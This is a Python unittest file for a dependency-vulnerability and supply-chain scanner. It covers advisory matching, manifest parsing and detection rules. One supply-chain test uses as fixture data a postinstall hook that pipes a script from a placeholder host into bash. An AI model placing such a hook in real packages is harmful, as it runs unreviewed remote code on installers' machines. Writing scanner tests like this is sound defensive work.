import json
import unittest

from .helpers import by_rule, run_scanner
from redassay.scanners.deps import (
    DependencyScanner, load_advisories, match_advisories,
    parse_composer, parse_gemfile, parse_go_mod, parse_package_json, parse_pom, parse_requirements,
)


def scan(name: str, content: str, language: str = "npm-manifest"):
    return run_scanner(DependencyScanner(), name, content, language)


class AdvisoryDataTest(unittest.TestCase):
    def test_the_database_loads(self):
        index = load_advisories()
        self.assertGreater(len(index), 20)

    def test_every_entry_has_the_required_fields(self):
        for key, entries in load_advisories().items():
            for entry in entries:
                for field in ("id", "severity", "vulnerable", "title", "description"):
                    self.assertTrue(entry.get(field), f"{key} missing {field}")

    def test_matching_respects_the_range(self):
        self.assertTrue(match_advisories("npm", "lodash", "4.17.15"))
        self.assertFalse(match_advisories("npm", "lodash", "4.17.21"))

    def test_package_names_match_case_insensitively(self):
        self.assertTrue(match_advisories("pypi", "Django", "3.2.0"))

    def test_an_unknown_package_matches_nothing(self):
        self.assertEqual(match_advisories("npm", "a-package-that-does-not-exist", "1.0.0"), [])


class ManifestParsingTest(unittest.TestCase):
    def test_package_json(self):
        raw = json.dumps({"dependencies": {"a": "1.0.0"}, "devDependencies": {"b": "^2.0.0"}})
        parsed = dict((name, spec) for name, spec, _ in parse_package_json(raw))
        self.assertEqual(parsed, {"a": "1.0.0", "b": "^2.0.0"})

    def test_malformed_package_json_returns_nothing(self):
        self.assertEqual(parse_package_json("{not json"), [])

    def test_requirements_txt(self):
        raw = "requests==2.25.1\nflask>=2.0  # comment\n-r other.txt\n\ndjango[argon2]==3.2.1\n"
        parsed = dict((name, spec) for name, spec, _ in parse_requirements(raw))
        self.assertEqual(parsed["requests"], "==2.25.1")
        self.assertEqual(parsed["django"], "==3.2.1")
        self.assertNotIn("-r", parsed)

    def test_go_mod(self):
        raw = "module example.com/app\n\ngo 1.21\n\nrequire (\n\tgithub.com/gin-gonic/gin v1.9.0\n)\n"
        parsed = dict((name, spec) for name, spec, _ in parse_go_mod(raw))
        self.assertEqual(parsed["github.com/gin-gonic/gin"], "1.9.0")

    def test_gemfile(self):
        parsed = dict((n, s) for n, s, _ in parse_gemfile("gem 'rails', '6.1.0'\ngem 'puma'\n"))
        self.assertEqual(parsed["rails"], "6.1.0")
        self.assertEqual(parsed["puma"], "")

    def test_pom(self):
        raw = ("<dependency><groupId>org.yaml</groupId>"
               "<artifactId>snakeyaml</artifactId><version>1.33</version></dependency>")
        parsed = dict((n, s) for n, s, _ in parse_pom(raw))
        self.assertEqual(parsed["org.yaml:snakeyaml"], "1.33")

    def test_pom_skips_property_versions(self):
        raw = ("<dependency><groupId>a</groupId><artifactId>b</artifactId>"
               "<version>${b.version}</version></dependency>")
        self.assertEqual(parse_pom(raw), [])

    def test_composer(self):
        raw = json.dumps({"require": {"php": ">=8.0", "guzzlehttp/guzzle": "7.4.0"}})
        parsed = dict((n, s) for n, s, _ in parse_composer(raw))
        self.assertIn("guzzlehttp/guzzle", parsed)
        self.assertNotIn("php", parsed)          # not a package


class VulnerableDependencyTest(unittest.TestCase):
    def test_a_vulnerable_pin_is_reported(self):
        findings = scan("package.json", json.dumps({"dependencies": {"lodash": "4.17.15"}}))
        self.assertTrue(findings)
        self.assertIn("GHSA", findings[0].title)
        self.assertEqual(findings[0].confidence, "high")

    def test_a_patched_pin_is_not(self):
        self.assertEqual(scan("package.json", json.dumps({"dependencies": {"lodash": "4.17.21"}})), [])

    def test_a_range_lowers_confidence(self):
        findings = scan("package.json", json.dumps({"dependencies": {"lodash": "^4.17.15"}}))
        self.assertEqual(findings[0].confidence, "medium")
        self.assertIn("lockfile", findings[0].description)

    def test_requirements_are_matched_too(self):
        findings = scan("requirements.txt", "pyyaml==5.3.1\n", "pip-manifest")
        self.assertTrue(any("CVE-2020-14343" in f.title for f in findings))

    def test_the_reference_links_to_the_advisory(self):
        findings = scan("package.json", json.dumps({"dependencies": {"lodash": "4.17.15"}}))
        self.assertTrue(findings[0].references[0].startswith("https://"))


class SupplyChainTest(unittest.TestCase):
    def test_floating_version(self):
        findings = by_rule(scan("package.json", json.dumps({"dependencies": {"left-pad": "*"}})))
        self.assertIn("dep.floating-version", findings)

    def test_install_hook_running_remote_code(self):
        raw = json.dumps({"scripts": {"postinstall": "curl https://x.invalid/s.sh | bash"}})
        self.assertIn("dep.install-hook-remote-code", by_rule(scan("package.json", raw)))

    def test_a_benign_install_hook_is_fine(self):
        raw = json.dumps({"scripts": {"postinstall": "node ./scripts/build.js"}})
        self.assertNotIn("dep.install-hook-remote-code", by_rule(scan("package.json", raw)))

    def test_git_dependency(self):
        raw = json.dumps({"dependencies": {"thing": "git+https://github.com/x/y.git#main"}})
        self.assertIn("dep.non-registry-source", by_rule(scan("package.json", raw)))


if __name__ == "__main__":
    unittest.main()
